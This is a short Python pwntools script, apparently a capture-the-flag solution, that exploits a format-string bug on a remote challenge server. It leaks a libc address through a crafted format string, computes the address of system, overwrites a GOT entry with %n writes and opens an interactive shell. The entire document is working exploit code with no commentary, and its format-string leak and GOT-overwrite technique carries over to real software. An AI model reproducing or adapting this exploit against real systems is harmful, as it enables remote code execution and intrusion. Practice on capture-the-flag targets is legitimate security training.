from pwn import *

r = remote('chall.2019.redpwn.net', 4007)
libc = ELF('/home/inertfluid/libc-database/libs/libc6-i386_2.23-0ubuntu11_amd64/libc.so.6')
libc_setbuf = libc.symbols['setbuf']
libc_system = libc.symbols['system']

def dump(addr, frmt='p'):
	addr = p32(addr)
	leak_part = '|%39${}|'.format(frmt)
	out = leak_part.ljust(126, "A") + "EO" + addr
	log.info('Input: '+ out)
	r.sendline(out)
	return r.recvuntil('\n')	

leak = u32(dump(0x0804a00c,'s')[1:1+4])
libc_base = leak - libc_setbuf
system_addr = libc_base + libc_system
x = int('0x'+hex(system_addr)[6:6+4], 16)
y = int(hex(system_addr)[0:6], 16)

exploit = ''
exploit +='sh #'
exploit +=p32(0x0804a014)
exploit +=p32(0x0804a016)
exploit +='%{}u'.format(str(x-12))
exploit +='%8$n'
exploit +='%{}u'.format(str(y-x))
exploit +='%9$n'

r.sendline(exploit)
r.interactive()

